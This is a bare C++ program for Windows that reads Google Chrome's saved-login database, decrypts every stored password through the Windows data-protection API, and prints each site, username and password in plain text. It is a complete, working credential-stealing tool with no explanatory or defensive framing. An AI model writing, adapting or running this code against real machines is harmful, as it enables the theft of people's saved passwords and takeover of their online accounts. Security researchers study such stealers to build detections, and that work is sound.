#include <iostream>
#include <Windows.h>
#include <Shlobj.h>

#pragma comment(lib, "Crypt32")

typedef int(*Sqlite3_open_v2)(const char *filename, void **ppDb, int flags, const char *zVfs);
typedef int(*Sqlite3_close)(void *pDb);
typedef const unsigned char* (*Sqlite3_column_text)(void *stmt, int col);
typedef void* (*Sqlite3_column_blob)(void *stmt, int col);
typedef int(*Sqlite3_prepare_v2)(void *pDb, const char *zSql, int nByte, void **ppStmt, const char **pzTail);
typedef int(*sqlite2_step)(void *stmt);
typedef int(*sqlite3_column_bytes)(void *stmt, int);


int main()
{
	char localAppDataPath[MAX_PATH];
	const char query[] = "SELECT signon_realm, username_value, password_value from 'logins';";
	void *pDb = nullptr;
	void *pStmt = nullptr;

	SHGetSpecialFolderPathA(0, localAppDataPath, CSIDL_LOCAL_APPDATA, false);

	std::string path(localAppDataPath);
	path += "\\Google\\Chrome\\User Data\\Default\\Login Data";

	HMODULE hModule = LoadLibraryA("sqlite3.dll");
	if (hModule == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "Couldn't load sqlite3.dll\n");
		return EXIT_FAILURE;
	}

	Sqlite3_open_v2 pSqlite3_open = (Sqlite3_open_v2)GetProcAddress(hModule, "sqlite3_open_v2");
	Sqlite3_close pSqlite3_close = (Sqlite3_close)GetProcAddress(hModule, "sqlite3_close");
	Sqlite3_prepare_v2 pSqlite3_prepare_v2 = (Sqlite3_prepare_v2)GetProcAddress(hModule, "sqlite3_prepare_v2");
	sqlite2_step pSqlite3_step = (sqlite2_step)GetProcAddress(hModule, "sqlite3_step");
	Sqlite3_column_text pSqlite3_column_text = (Sqlite3_column_text)GetProcAddress(hModule, "sqlite3_column_text");
	Sqlite3_column_blob pSqlite3_column_blob = (Sqlite3_column_blob)GetProcAddress(hModule, "sqlite3_column_blob");
	sqlite3_column_bytes pSqlite3_column_bytes = (sqlite3_column_bytes)GetProcAddress(hModule, "sqlite3_column_bytes");

	int ret = pSqlite3_open(path.c_str(), &pDb, 1 /* readonly */, NULL);
	if (ret)
	{
		fprintf(stderr, "sqlite3_open failed (%d)\n", ret);
		goto cleanup;
	}

	ret = pSqlite3_prepare_v2(pDb, query, -1, &pStmt, 0);
	if (ret)
	{
		fprintf(stderr, "sqlite3_prepare_v2 failed (%d)\n", ret);
		goto cleanup;
	}

	while (pSqlite3_step(pStmt) == 0x64) /* SQLITE_ROW */
	{
		const char *realm_logon = (const char*)pSqlite3_column_text(pStmt, 0);
		const char *username_value = (const char*)pSqlite3_column_text(pStmt, 1);

		DATA_BLOB encrypted_password_value{ pSqlite3_column_bytes(pStmt, 2), (BYTE*)pSqlite3_column_blob(pStmt, 2) };
		DATA_BLOB decrypted_password_value{};

		BOOL bSuccess = CryptUnprotectData(&encrypted_password_value, 0, 0, 0, 0, CRYPTPROTECT_UI_FORBIDDEN, &decrypted_password_value);
		if (bSuccess)
		{
			decrypted_password_value.pbData[decrypted_password_value.cbData] = 0;
			std::cout
				<< "realm:" << realm_logon
				<< " username: " << username_value
				<< " password: " << (const char*)decrypted_password_value.pbData
				<< std::endl;
		}
		else
			fprintf(stderr, "Failed to decrypt password (%d)\n", ret);
	}

cleanup:

	pSqlite3_close(pDb);
	FreeLibrary(hModule);

	return 0;
}
